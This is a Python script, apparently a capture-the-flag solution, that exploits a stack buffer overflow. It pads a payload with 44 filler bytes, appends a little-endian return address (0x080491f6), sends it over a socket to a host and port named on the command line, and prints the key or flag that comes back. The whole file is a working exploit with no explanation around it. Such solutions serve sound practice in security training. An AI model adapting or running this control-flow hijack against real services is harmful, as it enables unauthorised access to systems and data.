
def create_little_endian(hex_code):
    """creates and returns a new endian"""
    import struct

    return struct.pack("<I",hex_code )

def create_payload(endian_thingy):
    """constructs and returns a binary payload"""
    chars_to_overflow_with = b'A' * 44
    payload = b"".join ( [chars_to_overflow_with, endian_thingy] ) 
    return payload

def send_payload(host, port, payload):
    """
    sends the payload to the target server
    
    """
    import socket
    key = ""
    with socket.socket() as connection:
            connection.connect((host, port))

            connection.recv(4096).decode("utf-8")

            connection.send(payload+b"\n") #\n to signelfy pressing enter
            print(connection.recv(4096).decode("utf-8"))
            key = connection.recv(4096).decode("utf-8")
    return key

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("host", type=str, help="Host name to connect to")
    parser.add_argument("port", type=int, help="port to connect to")

    payload = create_payload(create_little_endian(0x080491f6))
    print(payload)
    args = parser.parse_args()
    key = send_payload(args.host,args.port, payload)
    print(key)

